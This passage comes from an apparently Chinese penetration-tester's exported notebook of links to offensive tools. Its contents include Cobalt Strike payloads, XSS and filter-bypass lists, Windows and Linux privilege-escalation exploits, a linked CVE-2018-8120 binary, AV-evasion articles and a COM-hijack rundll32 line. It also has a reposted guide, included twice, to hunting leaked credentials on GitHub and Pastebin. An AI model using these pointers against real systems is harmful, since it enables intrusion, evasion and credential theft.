rel="noopener">https://github.com/0xdea/tactical-exploitation</a></div></span><br></div><br><hr><br><a name="495"><br><br><div><br><span><div><a href="https://github.com/codewhitesec/LethalHTA/tree/master/CobaltStrike" target="_blank" rel="noopener">https://github.com/codewhitesec/LethalHTA/tree/master/CobaltStrike</a></div></span><br></div><br><hr><br><a name="497"><br><br><div><br><span><div><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a></div></span><br></div><br><hr><br><a name="498"><br><br><div><br><span><div><a href="https://github.com/austin-taylor/VulnWhisperer" target="_blank" rel="noopener">https://github.com/austin-taylor/VulnWhisperer</a></div></span><br></div><br><hr><br><a name="499"><br><br><div><br><span><div><a href="https://github.com/wez3/msfenum" target="_blank" rel="noopener">https://github.com/wez3/msfenum</a></div></span><br></div><br><hr><br><a name="500"><br><br><div><br><span><div><a href="https://github.com/thehappydinoa/TP-Link-defaults" target="_blank" rel="noopener">https://github.com/thehappydinoa/TP-Link-defaults</a></div></span><br></div><br><hr><br><a name="502"><br><br><div><br><span><div><img src="Demon分享_files/mmexport1527673496221.jpg" type="image/jpeg" data-filename="mmexport1527673496221.jpg">巧妙运行dll</div><div><br></div></span><br></div><br><hr><br><a name="506"><br><br><div><span><div><a href="https://paper.seebug.org/95/" target="_blank" rel="noopener">https://paper.seebug.org/95/</a></div></span><br></div><br><hr><br><a name="513"><br><br><div><span><div><a href="https://resources.infosecinstitute.com/powershell-for-pentesters-part-2-the-essentials-of-powershell/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/powershell-for-pentesters-part-2-the-essentials-of-powershell/</a></div></span><br></div><br><hr><br><a name="523"><br><br><div><br><span><div>作者：Twosecurity</div><div>链接：链接：https://www.zhihu.com/question/23073812/answer/219630853</div><div>来源：知乎</div><div>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</div><div><br></div><div>漏洞挖掘http://rips-scanner.sourceforge.net/ RIPS 自动化PHP代码安全审计RIPS是一款专门用来进行静态PHP代码审计的工具，能够帮助我们定位到可能存在漏洞的代码区域。使用指南 http://www.freebuf.com/articles/web/12232.htmlhttp://www.freebuf.com/articles/web/12232.htmlhttps://github.com/ajinabraham/Mobile-Security-Framework-MobSF 开源 iOS/Andriod 应用安全自动化测试平台Mobile Security Framework (移动安全框架) 是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。https://github.com/ajinabraham/Mobile-Security-Framework-MobSF使用说明 https://github.com/ajinabraham/Mobile-Security-Framework-MobSF/wiki/中文介绍 http://www.freebuf.com/sectool/77803.htmlhttp://www.freebuf.com/sectool/77803.htmlhttps://github.com/rapid7/IoTSeeker 智能家电漏洞扫描 一款基于端口对物联网默认凭证网络扫描的工具，针对特定的物联网设备进行检测这些自动化的工具可以帮助我们从结果这个角度去学习渗透测试Burpsuite，Web 手工挖掘漏洞必用下载 http://www.freebuf.com/sectool/99127.html实战指南 https://t0data.gitbooks.io/burpsuite/爆破字典 https://github.com/1N3/IntruderPayloadsSQLMap 扩展 https://github.com/difcareer/sqlmap4burpTCP 抓包扩展 https://github.com/summitt/Burp-Non-HTTP-ExtensionNmap https://nmap.org/安装 https://nmap.org/book/install.html上手教程 NMAP 基础教程 - he1renyagao进阶的使用 Nmap速查手册 - 我是壮丁Beef http://beefproject.com/Docker 镜像 https://hub.docker.com/r/janes/beef/实战指南 浏览器利用框架BeEF测试 - 三好学生AWVS，很厉害的 web 扫描器，简单易用下载 http://www.freebuf.com/sectool/71091.html （评论）使用教程 http://www.freebuf.com/sectool/100713.htmlHydra，常见网络服务登陆爆破工具下载 https://github.com/vanhauser-thc/thc-hydra/releases第三方 windows 版本下载 https://github.com/maaaaz/thc-hydra-windows/releases使用讲解 http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.htmlSqlmap，SQL注入最厉害的工具官网 http://sqlmap.org/上手教程 SQLMAP 实例COOKBOOK - lxj616进阶的使用 SQLMAP进阶使用 - MayIKissYou一段没有任何改动的代码，放在互联网上，也可能因为各种通用组件没有及时更新而变得脆弱。而搜索引擎则可以帮助我们更快的找到主机安全Shodan，撒旦 Shodan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。Shodan搜索引擎介绍 - 修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似https://www.zoomeye.org/help/manual信息泄漏GithubGitHub是全球最大的社交编程及代码托管网站。用户可以十分轻易地管理、存储、和搜索程序代码，其因此受到了广大程序员们的喜欢。  上面泄漏的敏感信息不仅只有个人的邮箱、企业后台，通过渗透黑客很可能获取企业的核心业务源代码，应用的逻辑架构，数据库地址、账号密码，内部vpn信息，人事信息等所有内部敏感信息，所带来的危害比被攻破数道防火墙，被挖掘出数个web漏洞要大得多！邮箱账户smtp @http://xxx.comsmtp password后台地址admin password数据库信息Mysql root passwordsa password云服务的密钥aliyun_access_idApiKeyGoogle        hackSite:http://baidu.com学习案例新浪某开发人员意识不足监控邮箱泄漏（github）搜狐某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）新浪某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）京东某开发人员意识不足泄漏一些敏感信息（github）唯品会某些开发人员意识不足泄漏敏感信息（github）盛大某开发人员意识不足泄漏内部邮箱帐号密码（github）迅雷某开发人员意识不足泄漏内部邮箱帐号密码（github）github-hacker之某短信运营商平台漏洞致上万用户信息泄漏其连锁反应不可想象|Pastebin Pastebin 与 github 不同，它不提供代码托管、版本控制等复杂的功能，只提供展示文本、代码最基本功能。所以经常被黑客用于披露或是存放数据，很多时候我们可以通过 pastebin 提前得到泄漏的数据。site:http://pastebin.com @http://163.comsite:http://pastebin.com @http://qq.comsite:http://pastebin.com appleid总之… 你能想到的，或多或少，应该都有，发挥你的想象力</div></span><br></div><br><hr><br><a name="524"><br><br><div><br><span><div><a href="https://github.com/frizb/vanquish" target="_blank" rel="noopener">https://github.com/frizb/vanquish</a></div></span><br></div><br><hr><br><a name="525"><br><br><div><span><div><a href="https://conference.hitb.org/hitbsecconf2018ams/materials/D2T1%2520-%2520Philip%2520Tsukerman%2520-%2520Expanding%2520Your%2520WMI%2520Lateral%2520Movement%2520Arsenal.pdf" target="_blank" rel="noopener">https://conference.hitb.org/hitbsecconf2018ams/materials/D2T1%2520-%2520Philip%2520Tsukerman%2520-%2520Expanding%2520Your%2520WMI%2520Lateral%2520Movement%2520Arsenal.pdf</a></div></span><br></div><br><hr><br><a name="526"><br><br><div><span><div><a href="https://redcanary.com/blog/active-breach-establishing-persistence/?utm_campaign=Blog&amp;utm_content=73611572&amp;utm_medium=social&amp;utm_source=twitter#admin-shares" target="_blank" rel="noopener">https://redcanary.com/blog/active-breach-establishing-persistence/?utm_campaign=Blog&amp;utm_content=73611572&amp;utm_medium=social&amp;utm_source=twitter#admin-shares</a></div></span><br></div><br><hr><br><a name="527"><br><br><div><span><div>rundll1132.exe -sta {注册表数值}</div><div><br></div><div><a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="noopener">https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/</a></div></span><br></div><br><hr><br><a name="528"><br><br><div><span><div>Linux提权审计:<span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://github.com/mzet-/linux-exploit-suggester</span></div></span><br></div><br><hr><br><a name="530"><br><br><div><span><div><a href="https://github.com/joker25000/Optiva-Framework" target="_blank" rel="noopener">https://github.com/joker25000/Optiva-Framework</a></div></span><br></div><br><hr><br><a name="630"><br><br><div><span><div><div style="margin: 0px; padding: 0px; box-sizing: border-box; color: rgb(51, 51, 51); font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; overflow: auto;"><div>wmic process call create “calc.exe”</div></div><pre style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; word-wrap: break-word !important; color: rgb(51, 51, 51); font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; overflow: auto;">wmic process where name=”calc.exe” call terminate</pre></div><div><img src="Demon分享_files/mmexport1527673769009.webp" type="image/webp" data-filename="mmexport1527673769009.webp"><img src="Demon分享_files/mmexport1527673770763.webp" type="image/webp" data-filename="mmexport1527673770763.webp"></div></span><br></div><br><hr><br><a name="655"><br><br><div><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://github.com/m4ll0k/Galileo</span></div></span><br></div><br><hr><br><a name="657"><br><br><div><span><div><a href="https://securityonline.info/opendoor-owasp-web-directory-scanner/" target="_blank" rel="noopener">https://securityonline.info/opendoor-owasp-web-directory-scanner/</a></div></span><br></div><br><hr><br><a name="684"><br><br><div><span><div><a href="https://github.com/smgorelik/Windows-RCE-exploits" target="_blank" rel="noopener">https://github.com/smgorelik/Windows-RCE-exploits</a></div></span><br></div><br><hr><br><a name="694"><br><br><div><span><div>内核提权漏洞</div><div>漏洞描述:<a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8166" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8166</a></div><div><br></div><div><a href="Demon分享_files/CVE-2018-8120.exe"><img src="Demon分享_files/eb8d2266c08cbaa20b428432066c25f7.png" alt="CVE-2018-8120.exe"></a>64位有可能卡死</div></span><br></div><br><hr><br><a name="699"><br><br><div><span><div><a href="https://n0where.net/protection-against-port-scanners-portspoof" target="_blank" rel="noopener">https://n0where.net/protection-against-port-scanners-portspoof  </a></div></span><br></div><br><hr><br><a name="701"><br><br><div><span><div><a href="https://github.com/rootm0s/WinPwnage" target="_blank" rel="noopener">https://github.com/rootm0s/WinPwnage</a></div><div><img src="Demon分享_files/-4d578e12a0f6d5f2.jpg" type="image/jpeg" data-filename="-4d578e12a0f6d5f2.jpg"></div></span><br></div><br><hr><br><a name="703"><br><br><div><span><div>适用于:内网渗透</div><div><a href="https://n0where.net/automated-privilege-escalation-portia" target="_blank" rel="noopener">https://n0where.net/automated-privilege-escalation-portia</a></div></span><br></div><br><hr><br><a name="710"><br><br><div><span><div>https://github.com/api0cradle/LOLBAS   我觉得内网渗透的人 应该人手一份</div></span><br></div><br><hr><br><a name="712"><br><br><div><span><div><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank" rel="noopener">https://github.com/ismailtasdelen/xss-payload-list</a></div></span><br></div><br><hr><br><a name="713"><br><br><div><span><div><a href="http://payloads.online/archivers/2018-05-02/1#0-qzone-1-51191-d020d2d2a4e8d1a374a433f596ad1440" target="_blank" rel="noopener">http://payloads.online/archivers/2018-05-02/1#0-qzone-1-51191-d020d2d2a4e8d1a374a433f596ad1440</a></div></span><br></div><br><hr><br><a name="714"><br><br><div><span><div><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></div></span><br></div><br><hr><br><a name="729"><br><br><div><span><div>@即刻安全-无尘 工具包工具包https://www.52pojie.cn/thread-463343-1-1.html   虚拟机虚拟机https://www.52pojie.cn/thread-661779-1-1.html</div></span><br></div><br><hr><br><a name="731"><br><br><div><span><div><a href="https://www.pentestpartners.com/security-blog/from-png-text-to-persistent-xss/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/from-png-text-to-persistent-xss/</a></div></span><br></div><br><hr><br><a name="733"><br><br><div><span><div><a href="https://github.com/mdsecactivebreach/SharpShooter/blob/master/Readme.md" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter/blob/master/Readme.md</a></div></span><br></div><br><hr><br><a name="910"><br><br><div><span><div><a href="https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/" target="_blank" rel="noopener">https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/</a></div></span><br></div><br><hr><br><a name="911"><br><br><div><span><div><a href="https://mp.weixin.qq.com/s/tt1NDweTkmIJke1VS7s7jw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tt1NDweTkmIJke1VS7s7jw</a></div></span><br></div><br><hr><br><a name="917"><br><br><div><span><div><a href="https://github.com/fgeek/pyfiscan/blob/master/README.md" target="_blank" rel="noopener">https://github.com/fgeek/pyfiscan/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="921"><br><br><div><br><span><div><a href="https://github.com/1N3/IntruderPayloads" target="_blank" rel="noopener">https://github.com/1N3/IntruderPayloads</a></div></span><br></div><br><hr><br><a name="923"><br><br><div><br><span><div><a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/" target="_blank" rel="noopener">https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/</a></div></span><br></div><br><hr><br><a name="935"><br><br><div><br><span><div>例子：x=[1,2,3,4,5]</div><div>          print(&quot;,&quot;.join(str(i)for i in x))</div></span><br></div><br><hr><br><a name="936"><br><br><div><br><span><div><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md" target="_blank" rel="noopener">https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md</a></div></span><br></div><br><hr><br><a name="938"><br><br><div><span><div><p style="margin: 0px 0px 25px; color: rgb(187, 187, 187); font-family: Monda, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-size: 14px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(51, 51, 51); text-decoration-style: initial; text-decoration-color: initial;">独角兽是使用PowerShell降级攻击并直接将shellcode插入内存的简单工具。基于Matthew Graeber的PowerShell攻击和由David Kennedy（TrustedSec）和Josh Kelly在Defcon 18提供的PowerShell旁路技术。</p><div style="margin: 0px 0px 25px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(51, 51, 51); text-decoration-style: initial; text-decoration-color: initial;"><div><span style="color: rgb(187, 187, 187);"><span style="font-size: 14px;"><span style="font-family: Monda, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;">用法很简单，只需运行Magic Unicorn（确保在使用Metasploit方法并在正确的路径中安装Metasploit），魔术独角兽会自动生成一个PowerShell命令，您只需将PowerShell代码剪切并粘贴到命令行窗口或通过有效载荷传送系统。独角兽支持你自己的shellcode，和Metasploit</span></span></span></div><div><a href="http://www.ggsec.cn/unicorn.html" target="_blank" rel="noopener">http://www.ggsec.cn/unicorn.html</a></div></div></div></span><br></div><br><hr><br><a name="940"><br><br><div><span><div><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></div></span><br></div><br><hr><br><a name="941"><br><br><div><span><div>youtube关注:Penetration Testing in Linux</div></span><br></div><br><hr><br><a name="948"><br><br><div><span><div><a href="https://github.com/swisskyrepo/PayloadsAllTheThings?files=1" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings?files=1</a></div></span><br></div><br><hr><br><a name="953"><br><br><div><span><div><a href="https://github.com/p3nt4/Invoke-Piper" target="_blank" rel="noopener">https://github.com/p3nt4/Invoke-Piper</a></div></span><br></div><br><hr><br><a name="957"><br><br><div><span><div><a href="https://github.com/jobertabma/ground-control" target="_blank" rel="noopener">https://github.com/jobertabma/ground-control</a></div></span><br></div><br><hr><br><a name="958"><br><br><div><span><div>用于寻找ad组策略容易受到攻击的</div><div>powershell脚本:<a href="https://github.com/l0ss/Grouper" target="_blank" rel="noopener">https://github.com/l0ss/Grouper</a></div></span><br></div><br><hr><br><a name="960"><br><br><div><span><div><a href="http://mp.weixin.qq.com/s?__biz=MzI4MDQ1MzQ0NA==&amp;mid=2247483908&amp;idx=1&amp;sn=0ee87c9d7c66778b1ffe1fa46e9647b7&amp;chksm=ebb90a2fdcce83393af0a3c14b15d5a3a14677cef0e9f8c726d87761be8d7068c469dc05e772&amp;mpshare=1&amp;scene=23&amp;srcid=03250Ys5bPhYde4c2tJ6zBfa#rd" target="_blank" rel="noopener">http://mp.weixin.qq.com/s?<strong>biz=MzI4MDQ1MzQ0NA==&amp;mid=2247483908&amp;idx=1&amp;sn=0ee87c9d7c66778b1ffe1fa46e9647b7&amp;chksm=ebb90a2fdcce83393af0a3c14b15d5a3a14677cef0e9f8c726d87761be8d7068c469dc05e772&amp;mpshare=1&amp;scene=23&amp;srcid=03250Ys5bPhYde4c2tJ6zBfa#rd</strong></a></div></span><br></div><br><hr><br><a name="964"><br><br><div><br><span><div><a href="https://github.com/Moham3dRiahi/Th3inspector" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/Th3inspector</a></div></span><br></div><br><hr><br><a name="965"><br><br><div><br><span><div><a href="https://github.com/Moham3dRiahi/XAttacker" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/XAttacker</a></div></span><br></div><br><hr><br><a name="969"><br><br><div><span><div>&lt;a href=”http://mp.weixin.qq.com/s?biz=MjM5NTc2MDYxMw==&amp;mid=2458288524&amp;idx=1&amp;sn=7186aacb3aaf913a034b7c96b08e616f&amp;chksm=b181b10686f638107f07b425533528a6c79a7a2400c8ac7a00a222f37f59321e5e964b28795a&amp;mpshare=1&amp;scene=23&amp;srcid=0323pYe4Q0rg8aNfMhlCOzLP#rd”&gt;http://mp.weixin.qq.com/s?<strong>biz=MjM5NTc2MDYxMw==&amp;mid=2458288524&amp;idx=1&amp;sn=7186aacb3aaf913a034b7c96b08e616f&amp;chksm=b181b10686f638107f07b425533528a6c79a7a2400c8ac7a00a222f37f59321e5e964b28795a&amp;mpshare=1&amp;scene=23&amp;srcid=0323pYe4Q0rg8aNfMhlCOzLP#rd</strong></div></span></div></a><br><br><hr><br><a name="973"><br><br><div><span><div><a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/</a></div></span><br></div><br><hr><br><a name="1341"><br><br><div><span><div>&lt;a href=”http://mp.weixin.qq.com/s?biz=MjM5MDkwNjA2Nw==&amp;mid=2650374095&amp;idx=1&amp;sn=5d0fdb1efdba018f36a55aaa40c9aa7a&amp;chksm=beb07c7389c7f5650d3f1d26e0d5d5f230a5e569498f23dbb4cac925c34a133bf256a826f0b1&amp;mpshare=1&amp;scene=23&amp;srcid=032001PiVJ4OYGxi0zPubJdp#rd”&gt;http://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&amp;mid=2650374095&amp;idx=1&amp;sn=5d0fdb1efdba018f36a55aaa40c9aa7a&amp;chksm=beb07c7389c7f5650d3f1d26e0d5d5f230a5e569498f23dbb4cac925c34a133bf256a826f0b1&amp;mpshare=1&amp;scene=23&amp;srcid=032001PiVJ4OYGxi0zPubJdp#rd</div></span></div></a><br><br><hr><br><a name="1342"><br><br><div><span><div><a href="http://www.cnblogs.com/backlion/p/7908563.html" target="_blank" rel="noopener">http://www.cnblogs.com/backlion/p/7908563.html</a></div></span><br></div><br><hr><br><a name="1343"><br><br><div><span><div><a href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet" target="_blank" rel="noopener">https://github.com/masatokinugawa/filterbypass/wiki/Browser’s-XSS-Filter-Bypass-Cheat-Sheet</a></div></span><br></div><br><hr><br><a name="1359"><br><br><div><span><div><a href="https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-2/" target="_blank" rel="noopener">https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-2/</a></div></span><br></div><br><hr><br><a name="1360"><br><br><div><span><div>作者：Twosecurity<br>链接：链接：https://www.zhihu.com/question/23073812/answer/219630853<br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br><br></div><div>漏洞挖掘http://rips-scanner.sourceforge.net/ RIPS 自动化PHP代码安全审计RIPS是一款专门用来进行静态PHP代码审计的工具，能够帮助我们定位到可能存在漏洞的代码区域。使用指南 http://www.freebuf.com/articles/web/12232.htmlhttp://www.freebuf.com/articles/web/12232.htmlhttps://github.com/ajinabraham/Mobile-Security-Framework-MobSF 开源 iOS/Andriod 应用安全自动化测试平台Mobile Security Framework (移动安全框架) 是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。https://github.com/ajinabraham/Mobile-Security-Framework-MobSF使用说明 https://github.com/ajinabraham/Mobile-Security-Framework-MobSF/wiki/中文介绍 http://www.freebuf.com/sectool/77803.htmlhttp://www.freebuf.com/sectool/77803.htmlhttps://github.com/rapid7/IoTSeeker 智能家电漏洞扫描 一款基于端口对物联网默认凭证网络扫描的工具，针对特定的物联网设备进行检测这些自动化的工具可以帮助我们从结果这个角度去学习渗透测试Burpsuite，Web 手工挖掘漏洞必用下载 http://www.freebuf.com/sectool/99127.html实战指南 https://t0data.gitbooks.io/burpsuite/爆破字典 https://github.com/1N3/IntruderPayloadsSQLMap 扩展 https://github.com/difcareer/sqlmap4burpTCP 抓包扩展 https://github.com/summitt/Burp-Non-HTTP-ExtensionNmap https://nmap.org/安装 https://nmap.org/book/install.html上手教程 NMAP 基础教程 - he1renyagao进阶的使用 Nmap速查手册 - 我是壮丁Beef http://beefproject.com/Docker 镜像 https://hub.docker.com/r/janes/beef/实战指南 浏览器利用框架BeEF测试 - 三好学生AWVS，很厉害的 web 扫描器，简单易用下载 http://www.freebuf.com/sectool/71091.html （评论）使用教程 http://www.freebuf.com/sectool/100713.htmlHydra，常见网络服务登陆爆破工具下载 https://github.com/vanhauser-thc/thc-hydra/releases第三方 windows 版本下载 https://github.com/maaaaz/thc-hydra-windows/releases使用讲解 http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.htmlSqlmap，SQL注入最厉害的工具官网 http://sqlmap.org/上手教程 SQLMAP 实例COOKBOOK - lxj616进阶的使用 SQLMAP进阶使用 - MayIKissYou一段没有任何改动的代码，放在互联网上，也可能因为各种通用组件没有及时更新而变得脆弱。而搜索引擎则可以帮助我们更快的找到主机安全Shodan，撒旦 Shodan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。Shodan搜索引擎介绍 - 修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似https://www.zoomeye.org/help/manual信息泄漏GithubGitHub是全球最大的社交编程及代码托管网站。用户可以十分轻易地管理、存储、和搜索程序代码，其因此受到了广大程序员们的喜欢。  上面泄漏的敏感信息不仅只有个人的邮箱、企业后台，通过渗透黑客很可能获取企业的核心业务源代码，应用的逻辑架构，数据库地址、账号密码，内部vpn信息，人事信息等所有内部敏感信息，所带来的危害比被攻破数道防火墙，被挖掘出数个web漏洞要大得多！邮箱账户smtp @http://xxx.comsmtp password后台地址admin password数据库信息Mysql root passwordsa password云服务的密钥aliyun_access_idApiKeyGoogle        hackSite:http://baidu.com学习案例新浪某开发人员意识不足监控邮箱泄漏（github）搜狐某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）新浪某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）京东某开发人员意识不足泄漏一些敏感信息（github）唯品会某些开发人员意识不足泄漏敏感信息（github）盛大某开发人员意识不足泄漏内部邮箱帐号密码（github）迅雷某开发人员意识不足泄漏内部邮箱帐号密码（github）github-hacker之某短信运营商平台漏洞致上万用户信息泄漏其连锁反应不可想象|Pastebin Pastebin 与 github 不同，它不提供代码托管、版本控制等复杂的功能，只提供展示文本、代码最基本功能。所以经常被黑客用于披露或是存放数据，很多时候我们可以通过 pastebin 提前得到泄漏的数据。site:http://pastebin.com @http://163.comsite:http://pastebin.com @http://qq.comsite:http://pastebin.com appleid总之… 你能想到的，或多或少，应该都有，发挥你的想象力</div></span><br></div><br><hr><br><a name="1361"><br><br><div><span><div><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet#Do_not_limit_the_character_set_and_set_long_max_lengths_for_credentials" target="_blank" rel="noopener">https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet#Do_not_limit_the_character_set_and_set_long_max_lengths_for_credentials</a></div><div><br></div><div><br></div><div><br></div></span><br></div><br><hr><br><a name="1362"><br><br><div><span><div><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="noopener">https://github.com/0xbadjuju/Tokenvator</a></div></span><br></div><br><hr><br><a name="1365"><br><br><div><span><div><a href="https://github.com/ssl/ezXSS" target="_blank" rel="noopener">https://github.com/ssl/ezXSS</a></div></span><br></div><br><hr><br><a name="1366"><br><br><div><span><div>Linux提权攻击:<a href="https://n0where.net/linux-privilege-escalation-roothelper" target="_blank" rel="noopener">https://n0where.net/linux-privilege-escalation-roothelper</a></div></span><br></div><br><hr><br><a name="1367"><br><br><div><span><div><a href="https://secapps.com/appbandit" target="_blank" rel="noopener">https://secapps.com/appbandit</a></div></span><br></div><br><hr><br><a name="1388"><br><br><div><span><div><a href="https://github.com/hardenedlinux/linux-exploit-development-tutorial/blob/master/README.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/linux-exploit-development-tutorial/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="1389"><br><br><div><span><div><a href="https://github.com/DanMcInerney/icebreaker/blob/master/README.md" target="_blank" rel="noopener">https://github.com/DanMcInerney/icebreaker/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="1390"><br><br><div><span><div><a href="http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/" target="_blank" rel="noopener">http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/</a></div></span><br></div><br><hr><br><a name="1391"><br><br><div><span><div><a href="https://t.co/vXPrr33S7B" target="_blank" rel="noopener">https://t.co/vXPrr33S7B</a></div><div>Ubuntu 16.04.4 kernel priv esc</div></span><br></div><br><hr><br><a name="1463"><br><br><div><span><div><br></div><div><div style="box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; padding-bottom: 0.3em; border-bottom: 1px solid rgb(234, 236, 239); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><div><a href="https://github.com/sevagas/macro_pack/blob/master/README.md" target="_blank" rel="noopener">https://github.com/sevagas/macro_pack/blob/master/README.md</a></div><div><span style="color: rgb(36, 41, 46);"><span style="font-size: 24px;"><span style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;"><span style="font-weight: 600;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">简短的介绍</font></font></span></span></span></span></div></div><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, 